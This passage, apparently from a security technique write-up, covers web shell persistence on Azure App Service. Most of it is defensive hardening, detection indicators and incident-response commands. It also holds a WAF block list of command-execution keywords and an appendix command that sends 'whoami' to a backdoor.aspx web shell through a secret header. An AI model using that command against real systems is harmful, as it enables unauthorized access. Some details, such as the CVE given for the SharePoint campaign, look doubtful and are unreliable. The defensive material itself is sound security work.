Restrict who can push code to the production branch.

**Manual Steps (Azure DevOps or GitHub):**
1. Go to **Repo Settings**
2. Under **Branch policies**, select the production branch (e.g., `main`)
3. Enable **Require a minimum number of reviewers** (e.g., 2 reviewers)
4. Enable **Require an associated work item**
5. Enable **Require a linked work item**
6. Set **Automatically complete pull requests** to `Disabled`
7. Require successful build validation before merge

---

### Priority 2: HIGH

**4. Monitor File Uploads to Web Directories**

**Manual Steps (Azure App Service Diagnostic Settings):**
1. Go to **App Service** → **Diagnostic settings**
2. Click **+ Add diagnostic setting**
3. Enable: **AppServiceFileAuditLogs** and **AppServiceAuditLogs**
4. Send to **Log Analytics workspace**
5. Create an alert in Sentinel (see Sentinel Detection section above)

**5. Implement Web Application Firewall (WAF) Rules**

Block suspicious file uploads and web shell patterns.

**Manual Steps (Application Gateway + WAF):**
1. Go to **Application Gateway** → **WAF Policy**
2. Create custom rules to block:
   - File uploads with dangerous extensions: `.aspx`, `.jsp`, `.php`
   - Requests containing command execution patterns: `cmd.exe`, `powershell`, `bash`
3. Apply the WAF to your App Service backend pool

---

### Access Control & Policy Hardening

**6. Conditional Access Policy: Require Compliant Device for Deployments**

Restrict deployments to only come from managed/compliant devices.

**Manual Steps:**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Name: `Restrict App Service Deployments to Compliant Devices`
4. **Assignments:**
   - Users: **All users**
   - Cloud apps: **Select "Azure App Service"**
5. **Conditions:**
   - Device state: **Require device to be marked as compliant**
6. **Access controls:**
   - Grant: **Require device to be marked as compliant**
7. Enable policy: **On**
8. Click **Create**

**7. RBAC: Limit Who Can Deploy Code**

Remove overly permissive roles.

**Manual Steps:**
1. Go to **App Service** → **Access control (IAM)**
2. Review all users with roles: **Owner**, **Contributor**, **Website Contributor**
3. Remove unnecessary role assignments
4. Create a custom role with **minimal permissions:**
   - `Microsoft.Web/sites/publish/action` (deploy code)
   - `Microsoft.Web/sites/read` (view site)
   - Do NOT include: `Microsoft.Web/sites/write`, `Microsoft.Web/sites/delete`

**Validation Command (Verify Mitigations):**
```powershell
# Check if basic auth for Kudu is disabled
$webApp = Get-AzWebApp -ResourceGroupName "myapp-rg" -Name "myapp"
$webApp.SiteConfig.BasicAuthPublishingCredentialsEnabled

# Expected Output: False (if secure)

# Check if managed identity is enabled
$webApp.Identity.PrincipalId

# Expected Output: [GUID of managed identity] (if secure)
```

**Expected Output (If Secure):**
```
BasicAuthPublishingCredentialsEnabled : False
PrincipalId                           : a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

**What to Look For:**
- `BasicAuthPublishingCredentialsEnabled` should be `False`
- `PrincipalId` should be populated (indicates managed identity is enabled)
- If output shows `True` for basic auth, the mitigation is not in place

---

## 14. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `C:\home\site\wwwroot\*.aspx` (unexpected ASPX files)
- `C:\home\site\wwwroot\*.php` (if application is not PHP-based)
- `/home/site/wwwroot/*.py` (if not Python application)
- `C:\Program Files\git\bin\git.exe` (Git deployed on App Service)
- `C:\temp\*.zip` (temporary backdoor archives)

**Registry:**
- `HKLM\System\CurrentControlSet\Services\W3SVC\Parameters\` (IIS configuration changes)
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\` (persistence mechanisms)

**Network:**
- Outbound connections from `w3wp.exe` to unusual ports/IPs
- DNS queries for C2 domains from App Service

**Cloud Audit Logs:**
- `AzureActivity`: Operation "Create Deployment" with unexpected authors
- `AppServiceAuditLogs`: File changes in web directories with suspicious timestamps
- `AppServiceFileAuditLogs`: `.aspx`, `.php`, `.jsp` file creation

**Git History:**
- Suspicious commits with obfuscated messages (e.g., "Update error handling")
- Commits containing base64-encoded or encrypted payloads
- Authors that are service accounts or automation accounts

---

### Forensic Artifacts

**Disk:**
- `C:\home\site\wwwroot\backdoor.aspx` (backdoor file on disk)
- `C:\ProgramData\Git\config` (Git configuration with embedded credentials)
- `C:\Users\[AppServiceUser]\.git\config` (local Git repository data)
- `C:\Windows\System32\drivers\etc\hosts` (DNS hijacking)

**Memory:**
- `w3wp.exe` process memory (may contain shell commands, reverse shell payloads)
- `cmd.exe` spawned from `w3wp.exe` (web shell execution)

**Cloud:**
- `AuditData` field in `AzureActivity` table (contains deployment payload details)
- App Service diagnostic logs showing file access/modification times
- Git commit hashes and diffs in source control audit logs

**Application Logs:**
- IIS access logs showing requests to web shell endpoints
- Application error logs showing exceptions from backdoored code
- Custom application logs that may reveal execution patterns

---

### Response Procedures

**1. Isolate:**

**Azure Command:**
```powershell
# Stop the App Service to prevent further exploitation
Stop-AzWebApp -ResourceGroupName "myapp-rg" -Name "myapp"

# Verify it's stopped
Get-AzWebApp -ResourceGroupName "myapp-rg" -Name "myapp" | Select-Object Name, State
```

**Expected Output:**
```
Name                    State
----                    -----
myapp                   Stopped
```

**Manual (Portal):**
- Go to **Azure Portal** → **App Service** → Click **Stop**

**2. Collect Evidence:**

```powershell
# Export deployment history
$deployments = Get-AzWebAppSlotPublishingProfile -ResourceGroupName "myapp-rg" -Name "myapp"

# Export Git commit log
git log --oneline --all > "C:\Incident\git-history.txt"

# Export diagnostic logs
$diagnosticLogs = Get-AzWebApp -ResourceGroupName "myapp-rg" -Name "myapp" `
  | Get-AzWebAppDiagnosticLog

# Export activity logs
Get-AzActivityLog -ResourceGroupName "myapp-rg" -StartTime (Get-Date).AddDays(-7) `
  | Export-Csv -Path "C:\Incident\activity-logs.csv"
```

**Manual (Portal):**
1. Go to **App Service** → **Deployment slots** → **Deployment History** → **Export**
2. Go to **App Service** → **Log stream** → Copy all output
3. Go to **Azure Monitor** → **Activity log** → **Download events as CSV**

**3. Remediate:**

```powershell
# Step 1: Remove the backdoor from source control
git log --oneline
git revert [commit-hash-of-backdoor]
git push origin main

# Step 2: Reset deployment credentials (invalidates stolen credentials)
Reset-AzWebAppPublishingProfile -ResourceGroupName "myapp-rg" -Name "myapp"

# Step 3: Redeploy clean code
Publish-AzWebapp -ResourceGroupName "myapp-rg" -Name "myapp" -ArchivePath "C:\clean-backup.zip"

# Step 4: Restart the App Service
Start-AzWebApp -ResourceGroupName "myapp-rg" -Name "myapp"
```

**Manual (Portal):**
1. Go to **App Service** → **Deployment Center** → Click **Disconnect** (if using GitHub/DevOps)
2. Go to **Deployment slots** → Right-click the compromised slot → **Delete**
3. Redeploy from a known-good backup: **Deployment Center** → Select source → Click **Deploy**

**4. Validate Remediation:**

```powershell
# Verify no suspicious files exist
# (This requires RDP/SSH into the App Service)
dir C:\home\site\wwwroot\*.aspx

# Expected: Only legitimate application files, no backdoors

# Verify Git history is clean
git log --all --oneline | grep -i "backdoor|shell|exploit"

# Expected: No results (if clean)

# Verify deployment credentials are new
Get-AzWebAppPublishingProfile -ResourceGroupName "myapp-rg" -Name "myapp" -OutputFile "new-profile.xml"

# Expected: New XML file with new credentials
```

---

## 15. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker tricks user into authorizing a malicious Entra ID app, gaining access to Azure credentials |
| **2** | **Credential Access** | [CA-UNSC-007] Azure Key Vault Secret Extraction | Attacker steals App Service deployment credentials from Key Vault |
| **3** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Registration Permissions Escalation | Attacker escalates to Global Admin via app registration abuse |
| **4** | **Current Step** | **[PERSIST-SERVER-006]** | **Attacker deploys web shell to App Service, achieving persistence** |
| **5** | **Collection** | [C-WEB-001] Web Application Data Harvesting | Attacker uses web shell to access application database and exfiltrate customer data |
| **6** | **Impact** | [I-RANSOM-001] Data Encryption via Ransomware | Attacker deploys ransomware payload through web shell |

---

## 16. REAL-WORLD EXAMPLES

### Example 1: Storm-2603 SharePoint and App Service Exploitation (2025)

- **Target:** On-premises organizations using Azure App Service for web applications
- **Timeline:** June 2025 – August 2025
- **Technique Status:** Threat actors used T1505.003 alongside on-premises SharePoint exploitation (CVE-2024-21816)
- **Impact:** 
  - Deployed web shells (`spinstall0.aspx`) to SharePoint and App Service instances
  - Established persistent remote access
  - Exfiltrated sensitive documents and credentials
  - Laterally moved to on-premises Active Directory via hybrid identity
- **Reference:** [Microsoft MSRC Blog: Disrupting Active Exploitation of SharePoint Vulnerabilities](https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilitie/)

### Example 2: Kudu SCM CSRF Vulnerability (EmojiDeploy) – 2023

- **Target:** Azure App Service customers with publicly accessible Kudu endpoints
- **Timeline:** October 2022 – December 2022
- **Technique Status:** Active exploitation via SameSite cookie misconfiguration and CSRF bypass
- **Impact:**
  - Attackers crafted malicious websites that, when visited by authenticated users, silently deployed backdoored ZIP files
  - No user interaction required beyond visiting the attacker's website
  - Full application compromise with code execution as the App Service identity
- **Attack Method:**
  1. Attacker hosts malicious website
  2. Victim logs into Kudu (SCM) via browser
  3. Victim visits attacker's website (in another tab)
  4. Malicious JavaScript executes in victim's browser
  5. ZIP deployment request is sent to Kudu with CSRF token
  6. Backdoored code is deployed to production
- **Reference:** [Ermetic Blog: EmojiDeploy CSRF Vulnerability](https://www.securityweek.com/csrf-vulnerability-kudu-scm-allowed-code-execution-azure-services/)

### Example 3: Azure App Service Linux Vulnerabilities – 2025

- **Target:** Linux App Service instances using KuduLite
- **Timeline:** March 2025
- **Technique Status:** Multiple vulnerabilities in KuduLite SSH access and API validation
- **Impact:**
  - SSH root access to KuduLite management instance with default credentials
  - LFI/RCE via KuduLite API due to missing access checks
  - Ability to inject malicious code into Git repositories
- **Attack Scenario:**
  1. Attacker gains SSH access to KuduLite (weak credentials)
  2. Modifies the Git repository to include backdoor
  3. All subsequent deployments pull from the backdoored repository
  4. Persistence across all instances of the App Service
- **Reference:** [Intezer Blog: New Vulnerabilities in Microsoft Azure](https://intezer.com/blog/kud-i-enter-your-server-new-vulnerabilities-in-microsoft-azure/)

---

## APPENDIX: Testing Commands Summary

**Quick Test (Verify Technique Viability):**
```powershell
# 1. Check if Git deployment is enabled
Get-AzWebApp -ResourceGroupName "myapp-rg" -Name "myapp" | Select-Object RepositorySiteName

# 2. Attempt to get publishing credentials (if authorized)
Get-AzWebAppPublishingProfile -ResourceGroupName "myapp-rg" -Name "myapp" -OutputFile "test-profile.xml" -ErrorAction SilentlyContinue

# 3. List deployment history
Get-AzWebAppSlot -ResourceGroupName "myapp-rg" -Name "myapp" | Get-AzWebAppDeployment
```

**Verification Command (Post-Exploitation):**
```powershell
# Verify backdoor is deployed
Invoke-WebRequest "https://myapp.azurewebsites.net/backdoor.aspx" -Headers @{"X-Secret-Command" = "whoami"}

# Expected: If backdoor is active, returns current user context (e.g., "NT AUTHORITY\SYSTEM")
```

---